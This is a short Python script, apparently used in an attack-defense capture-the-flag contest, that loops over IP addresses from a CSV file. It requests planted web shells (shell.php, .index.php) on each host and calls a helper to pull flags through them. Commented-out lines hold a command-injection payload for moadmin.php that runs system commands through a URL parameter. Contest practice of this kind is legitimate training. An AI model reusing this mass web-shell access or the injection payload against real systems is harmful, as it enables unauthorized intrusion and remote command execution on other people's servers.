import requests
import getSig2

file = open("ips.csv",'r')

iplist = []
for _ in file:

    # print(_.replace('\n','').split(',')[1:])
    # for __ in _.replace('\n','').split(',')[1:]:
    for __ in _.replace('\n','').split(',')[1:]:
        # print(__)
        iplist.append(__)
    # iplist.append(__ for __ in _.replace('\n','').split(',')[1:])
print(iplist)


count = 0
for _ in iplist:
    url = "http://" + _ +":80/time/files/shell.php"

    try:
        r = requests.get(url)
    except:
        pass
    # if r.status_code == 200:
    count += 1
    print(url , r.status_code)
    getSig2.getFlag('http://' + _ + '/time/files/shell.php')
    getSig2.getFlag('http://' + _ + '/time/files/.index.php')

        # http://192.168.34.124/ez_web/admin/moadmin.php?collection=zzz&action=listRows&find=array();system("hereiam -t >>");exit;
        # rxxx = requests.get("http://" + _ + "/ez_web/admin/moadmin.php?collection=zzz&action=listRows&find=array();system(" + ' "hereiam -t ' + getSig2.getsig() + '");exit;')

        # "http://" + _ + "/ez_web/admin/moadmin.php?collection=zzz&action=listRows&find=array();system(" + '"hereiam -t ' + getSig2.getsig() + '");exit;'
        # print(rxxx.text)
        # print(rxxx.status_code)


print(count)